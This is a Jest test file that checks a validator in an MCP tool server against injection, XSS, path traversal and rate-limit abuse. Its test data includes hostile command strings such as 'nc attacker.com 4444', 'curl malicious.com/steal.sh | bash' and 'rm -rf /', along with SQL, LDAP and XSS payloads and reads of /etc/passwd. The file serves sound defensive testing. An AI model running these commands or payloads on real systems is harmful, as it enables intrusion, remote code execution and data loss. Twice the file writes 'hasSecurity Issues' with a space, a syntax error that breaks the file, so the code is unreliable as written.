/**
 * Security Validation Tests
 * CONTEXT: Comprehensive security testing for input validation and sanitization
 * REASON: Ensure system security against common vulnerabilities and attacks
 * CHANGE: Security-focused testing for all input validation and sanitization
 * PREVENTION: Security vulnerabilities, injection attacks, data breaches
 */

import { jest } from '@jest/globals';
import { MCPInputValidator } from '../../src/validation/MCPInputValidator.js';
import { ValidationMiddleware } from '../../src/validation/ValidationMiddleware.js';
import { AdvancedValidators } from '../../src/validation/AdvancedValidators.js';
import { mockLogger } from '../mocks/index.js';

// Mock dependencies
jest.mock('../../src/utils/logger.js', () => ({
  logger: mockLogger
}));

describe('Security Validation Tests', () => {
  let inputValidator;
  let validationMiddleware;
  let advancedValidators;

  beforeEach(() => {
    inputValidator = new MCPInputValidator({
      strictMode: true,
      enableSanitization: true,
      maxInputLength: 10000,
      allowedFileTypes: ['.js', '.ts', '.jsx', '.tsx', '.cpp', '.h', '.ino']
    });

    validationMiddleware = new ValidationMiddleware({
      enableRateLimiting: true,
      maxRequestsPerMinute: 100,
      enableInputSanitization: true
    });

    advancedValidators = new AdvancedValidators();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Input Sanitization', () => {
    test('should sanitize malicious JavaScript code', () => {
      const maliciousCode = `
        // Innocent looking function
        function getData() {
          const data = eval(atob('YWxlcnQoImhhY2tlZCIp')); // Hidden alert
          document.cookie = 'stolen=true';
          return data;
        }
        
        // XSS attempt
        const userInput = "<script>alert('xss')</script>";
        document.getElementById('output').innerHTML = userInput;
      `;

      const result = inputValidator.sanitizeCode(maliciousCode);

      expect(result.hasSecurity Issues).toBe(true);
      expect(result.sanitizedCode).toBeDefined();
      expect(result.securityIssues).toContain('eval_usage');
      expect(result.securityIssues).toContain('dom_manipulation');
      expect(result.sanitizedCode).not.toContain('eval(');
      expect(result.sanitizedCode).not.toContain('.innerHTML');
    });

    test('should detect and prevent SQL injection attempts', () => {
      const sqlInjectionAttempts = [
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "'; DROP TABLE users; --",
        "UNION SELECT password FROM admin_users",
        "1'; DELETE FROM logs; SELECT * FROM users WHERE '1'='1"
      ];

      sqlInjectionAttempts.forEach(attempt => {
        const result = inputValidator.validateQueryString(attempt);

        expect(result.isValid).toBe(false);
        expect(result.securityIssues).toContain('sql_injection');
        expect(result.sanitized).toBeDefined();
        expect(result.sanitized).not.toContain('DROP TABLE');
        expect(result.sanitized).not.toContain('DELETE FROM');
      });
    });

    test('should prevent NoSQL injection attacks', () => {
      const noSQLInjections = [
        "{ $where: 'this.username == this.password' }",
        "{ $ne: null }",
        "{ $regex: '.*', $options: 'i' }",
        "{ $gt: '' }"
      ];

      noSQLInjections.forEach(injection => {
        const result = inputValidator.validateDatabaseQuery(injection);

        expect(result.isValid).toBe(false);
        expect(result.securityIssues).toContain('nosql_injection');
        expect(result.sanitized).toBeDefined();
      });
    });

    test('should sanitize file path traversal attempts', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        './node_modules/../../../etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' // URL encoded
      ];

      pathTraversalAttempts.forEach(attempt => {
        const result = inputValidator.validateFilePath(attempt);

        expect(result.isValid).toBe(false);
        expect(result.securityIssues).toContain('path_traversal');
        expect(result.sanitizedPath).toBeDefined();
        expect(result.sanitizedPath).not.toContain('../');
        expect(result.sanitizedPath).not.toContain('..\\');
      });
    });

    test('should detect and prevent command injection', () => {
      const commandInjections = [
        "filename.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "input.js | nc attacker.com 4444",
        "test.cpp; curl malicious.com/steal.sh | bash",
        "$(curl evil.com/backdoor.sh)"
      ];

      commandInjections.forEach(injection => {
        const result = inputValidator.validateCommandInput(injection);

        expect(result.isValid).toBe(false);
        expect(result.securityIssues).toContain('command_injection');
        expect(result.sanitized).toBeDefined();
        expect(result.sanitized).not.toContain(';');
        expect(result.sanitized).not.toContain('&&');
        expect(result.sanitized).not.toContain('|');
      });
    });

    test('should sanitize cross-site scripting (XSS) attempts', () => {
      const xssAttempts = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        "' onmouseover='alert(1)' '",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>"
      ];

      xssAttempts.forEach(attempt => {
        const result = inputValidator.sanitizeHtmlInput(attempt);

        expect(result.hasSecurity Issues).toBe(true);
        expect(result.sanitized).toBeDefined();
        expect(result.sanitized).not.toContain('<script>');
        expect(result.sanitized).not.toContain('javascript:');
        expect(result.sanitized).not.toContain('onload=');
        expect(result.sanitized).not.toContain('onerror=');
      });
    });

    test('should prevent LDAP injection attacks', () => {
      const ldapInjections = [
        "admin)(&))",
        "*)|(objectclass=*",
        "admin)(|(password=*))",
        "*)(uid=*))(|(uid=*"
      ];

      ldapInjections.forEach(injection => {
        const result = inputValidator.validateLdapInput(injection);

        expect(result.isValid).toBe(false);
        expect(result.securityIssues).toContain('ldap_injection');
        expect(result.sanitized).toBeDefined();
      });
    });
  });

  describe('Input Validation', () => {
    test('should validate MCP tool parameters securely', () => {
      const validRequest = {
        toolName: 'validate_against_kg',
        arguments: {
          codeSnippet: 'function test() { return "safe"; }',
          validationTypes: ['patterns', 'rules'],
          strictMode: true
        }
      };

      const result = inputValidator.validateMCPRequest(validRequest);

      expect(result.isValid).toBe(true);
      expect(result.sanitizedArguments).toBeDefined();
      expect(result.securityIssues).toHaveLength(0);
    });

    test('should reject malicious MCP tool parameters', () => {
      const maliciousRequest = {
        toolName: 'validate_against_kg',
        arguments: {
          codeSnippet: 'eval(atob("YWxlcnQoJ2hhY2tlZCcp"))',
          validationTypes: ['<script>alert("xss")</script>'],
          strictMode: true,
          maliciousParam: '; DROP TABLE users; --'
        }
      };

      const result = inputValidator.validateMCPRequest(maliciousRequest);

      expect(result.isValid).toBe(false);
      expect(result.securityIssues.length).toBeGreaterThan(0);
      expect(result.securityIssues).toContain('malicious_code');
    });

    test('should enforce input size limits', () => {
      const oversizedInput = {
        toolName: 'analyze_codebase',
        arguments: {
          codeSnippet: 'x'.repeat(50000), // Exceeds maxInputLength
          validationTypes: ['patterns']
        }
      };

      const result = inputValidator.validateMCPRequest(oversizedInput);

      expect(result.isValid).toBe(false);
      expect(result.securityIssues).toContain('input_size_exceeded');
    });

    test('should validate file upload security', () => {
      const fileUploadTests = [
        {
          fileName: 'malicious.exe',
          expected: false,
          reason: 'executable_file'
        },
        {
          fileName: 'script.bat',
          expected: false,
          reason: 'script_file'
        },
        {
          fileName: '../../../etc/passwd',
          expected: false,
          reason: 'path_traversal'
        },
        {
          fileName: 'normal.js',
          expected: true,
          reason: null
        },
        {
          fileName: 'component.tsx',
          expected: true,
          reason: null
        }
      ];

      fileUploadTests.forEach(test => {
        const result = inputValidator.validateFileUpload({
          fileName: test.fileName,
          content: 'test content'
        });

        expect(result.isValid).toBe(test.expected);
        if (!test.expected) {
          expect(result.securityIssues).toContain(test.reason);
        }
      });
    });

    test('should validate database query parameters', () => {
      const queryTests = [
        {
          query: 'MATCH (n:CodeEntity) RETURN n',
          params: { limit: 100 },
          expected: true
        },
        {
          query: 'MATCH (n) WHERE n.id = $id RETURN n',
          params: { id: "'; DROP TABLE users; --" },
          expected: false
        },
        {
          query: 'RETURN eval($code)',
          params: { code: 'malicious_code()' },
          expected: false
        }
      ];

      queryTests.forEach(test => {
        const result = inputValidator.validateDatabaseQuery(test.query, test.params);
        expect(result.isValid).toBe(test.expected);
      });
    });
  });

  describe('Authentication and Authorization', () => {
    test('should validate API tokens securely', () => {
      const tokenTests = [
        {
          token: 'valid-jwt-token-here',
          expected: true
        },
        {
          token: '../../../etc/passwd',
          expected: false
        },
        {
          token: '<script>alert("xss")</script>',
          expected: false
        },
        {
          token: 'SELECT * FROM tokens',
          expected: false
        }
      ];

      tokenTests.forEach(test => {
        const result = inputValidator.validateAuthToken(test.token);
        expect(result.isValid).toBe(test.expected);
      });
    });

    test('should prevent privilege escalation attempts', () => {
      const escalationAttempts = [
        {
          operation: 'delete_all_data',
          userRole: 'viewer',
          expected: false
        },
        {
          operation: 'admin_override',
          userRole: 'editor',
          expected: false
        },
        {
          operation: 'read_data',
          userRole: 'viewer',
          expected: true
        }
      ];

      escalationAttempts.forEach(attempt => {
        const result = inputValidator.validateUserPermissions(
          attempt.operation,
          attempt.userRole
        );
        expect(result.isAuthorized).toBe(attempt.expected);
      });
    });

    test('should implement secure session management', () => {
      const session = validationMiddleware.createSecureSession({
        userId: 'user123',
        role: 'editor',
        permissions: ['read', 'write']
      });

      expect(session.sessionId).toBeDefined();
      expect(session.expiresAt).toBeDefined();
      expect(session.csrfToken).toBeDefined();
      expect(session.signature).toBeDefined();

      // Validate session
      const isValid = validationMiddleware.validateSession(session);
      expect(isValid).toBe(true);

      // Test session tampering
      const tamperedSession = { ...session, role: 'admin' };
      const isTamperedValid = validationMiddleware.validateSession(tamperedSession);
      expect(isTamperedValid).toBe(false);
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    test('should implement request rate limiting', async () => {
      const clientId = 'test-client';
      const requests = [];

      // Generate many requests rapidly
      for (let i = 0; i < 150; i++) {
        requests.push(
          validationMiddleware.checkRateLimit(clientId, {
            endpoint: '/api/analyze',
            method: 'POST'
          })
        );
      }

      const results = await Promise.all(requests);
      const allowedRequests = results.filter(r => r.allowed).length;
      const blockedRequests = results.filter(r => !r.allowed).length;

      expect(allowedRequests).toBeLessThanOrEqual(100); // Rate limit of 100/min
      expect(blockedRequests).toBeGreaterThan(0);
    });

    test('should prevent resource exhaustion attacks', () => {
      const resourceTests = [
        {
          type: 'memory',
          payload: { data: 'x'.repeat(1000000) }, // 1MB
          expected: false
        },
        {
          type: 'cpu',
          payload: { iterations: 1000000 },
          expected: false
        },
        {
          type: 'normal',
          payload: { data: 'normal request' },
          expected: true
        }
      ];

      resourceTests.forEach(test => {
        const result = validationMiddleware.validateResourceUsage(test.payload);
        expect(result.allowed).toBe(test.expected);
      });
    });

    test('should detect and block suspicious patterns', () => {
      const suspiciousPatterns = [
        {
          requests: Array(50).fill('/api/admin'),
          reason: 'admin_endpoint_scanning'
        },
        {
          requests: ['/api/../../../etc/passwd', '/api/../../windows/system32'],
          reason: 'directory_traversal_scan'
        },
        {
          requests: Array(20).fill('/api/nonexistent'),
          reason: 'endpoint_enumeration'
        }
      ];

      suspiciousPatterns.forEach(pattern => {
        const result = validationMiddleware.detectSuspiciousActivity(
          'suspicious-client',
          pattern.requests
        );

        expect(result.isSuspicious).toBe(true);
        expect(result.reason).toBe(pattern.reason);
        expect(result.blocked).toBe(true);
      });
    });
  });

  describe('Cryptographic Security', () => {
    test('should use secure hashing for sensitive data', () => {
      const sensitiveData = 'user-password-123';
      
      const hash1 = advancedValidators.secureHash(sensitiveData);
      const hash2 = advancedValidators.secureHash(sensitiveData);

      expect(hash1).toBeDefined();
      expect(hash2).toBeDefined();
      expect(hash1).not.toBe(hash2); // Should use salt
      expect(hash1.length).toBeGreaterThan(32); // Should be long enough

      // Verify hashing
      const isValid1 = advancedValidators.verifyHash(sensitiveData, hash1);
      const isValid2 = advancedValidators.verifyHash(sensitiveData, hash2);

      expect(isValid1).toBe(true);
      expect(isValid2).toBe(true);
    });

    test('should encrypt sensitive data in transit', () => {
      const sensitiveData = {
        userCredentials: 'secret-api-key',
        personalInfo: 'user@example.com'
      };

      const encrypted = advancedValidators.encryptSensitiveData(sensitiveData);

      expect(encrypted.data).toBeDefined();
      expect(encrypted.iv).toBeDefined();
      expect(encrypted.tag).toBeDefined();
      expect(encrypted.data).not.toContain('secret-api-key');

      const decrypted = advancedValidators.decryptSensitiveData(encrypted);
      expect(decrypted).toEqual(sensitiveData);
    });

    test('should validate digital signatures', () => {
      const data = 'important message';
      const signature = advancedValidators.createDigitalSignature(data);

      expect(signature).toBeDefined();

      const isValid = advancedValidators.verifyDigitalSignature(data, signature);
      expect(isValid).toBe(true);

      // Test with tampered data
      const tamperedData = 'important message modified';
      const isValidTampered = advancedValidators.verifyDigitalSignature(tamperedData, signature);
      expect(isValidTampered).toBe(false);
    });
  });

  describe('Security Headers and Configuration', () => {
    test('should set secure HTTP headers', () => {
      const headers = validationMiddleware.getSecurityHeaders();

      expect(headers['X-Content-Type-Options']).toBe('nosniff');
      expect(headers['X-Frame-Options']).toBe('DENY');
      expect(headers['X-XSS-Protection']).toBe('1; mode=block');
      expect(headers['Strict-Transport-Security']).toBeDefined();
      expect(headers['Content-Security-Policy']).toBeDefined();
      expect(headers['Referrer-Policy']).toBe('strict-origin-when-cross-origin');
    });

    test('should validate CORS configuration securely', () => {
      const corsTests = [
        {
          origin: 'https://trusted-domain.com',
          expected: true
        },
        {
          origin: 'http://malicious-site.com',
          expected: false
        },
        {
          origin: 'https://subdomain.trusted-domain.com',
          expected: true
        },
        {
          origin: '*',
          expected: false // Wildcard should be rejected in production
        }
      ];

      corsTests.forEach(test => {
        const result = validationMiddleware.validateCorsOrigin(test.origin);
        expect(result.allowed).toBe(test.expected);
      });
    });
  });

  describe('Vulnerability Assessment', () => {
    test('should detect common vulnerabilities in code', () => {
      const vulnerableCode = `
        const express = require('express');
        const app = express();
        
        app.get('/user', (req, res) => {
          const userId = req.query.id;
          const query = "SELECT * FROM users WHERE id = '" + userId + "'";
          database.query(query, (err, results) => {
            res.send(results);
          });
        });
        
        app.post('/upload', (req, res) => {
          const userInput = req.body.content;
          eval(userInput); // Dangerous!
          res.send('Executed');
        });
      `;

      const vulnerabilities = advancedValidators.scanForVulnerabilities(vulnerableCode);

      expect(vulnerabilities.length).toBeGreaterThan(0);
      expect(vulnerabilities.some(v => v.type === 'sql_injection')).toBe(true);
      expect(vulnerabilities.some(v => v.type === 'code_injection')).toBe(true);
      expect(vulnerabilities.some(v => v.severity === 'critical')).toBe(true);
    });

    test('should provide security recommendations', () => {
      const codeIssues = [
        { type: 'sql_injection', severity: 'critical' },
        { type: 'xss', severity: 'high' },
        { type: 'weak_crypto', severity: 'medium' }
      ];

      const recommendations = advancedValidators.generateSecurityRecommendations(codeIssues);

      expect(recommendations.length).toBeGreaterThan(0);
      expect(recommendations.some(r => r.includes('parameterized queries'))).toBe(true);
      expect(recommendations.some(r => r.includes('input sanitization'))).toBe(true);
      expect(recommendations.some(r => r.includes('cryptographic'))).toBe(true);
    });
  });

  describe('Audit and Compliance', () => {
    test('should log security events for audit', () => {
      const securityEvent = {
        type: 'malicious_input_detected',
        source: 'user-input-validation',
        details: {
          inputType: 'code_snippet',
          threat: 'eval_injection',
          blocked: true
        },
        timestamp: new Date().toISOString(),
        severity: 'high'
      };

      validationMiddleware.logSecurityEvent(securityEvent);

      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.stringContaining('Security event'),
        expect.objectContaining({
          type: 'malicious_input_detected',
          severity: 'high'
        })
      );
    });

    test('should generate security compliance report', () => {
      const report = validationMiddleware.generateComplianceReport();

      expect(report).toHaveProperty('validationCoverage');
      expect(report).toHaveProperty('securityFeatures');
      expect(report).toHaveProperty('threatsMitigated');
      expect(report).toHaveProperty('complianceLevel');

      expect(report.validationCoverage).toBeGreaterThan(90);
      expect(report.complianceLevel).toBe('high');
    });
  });
});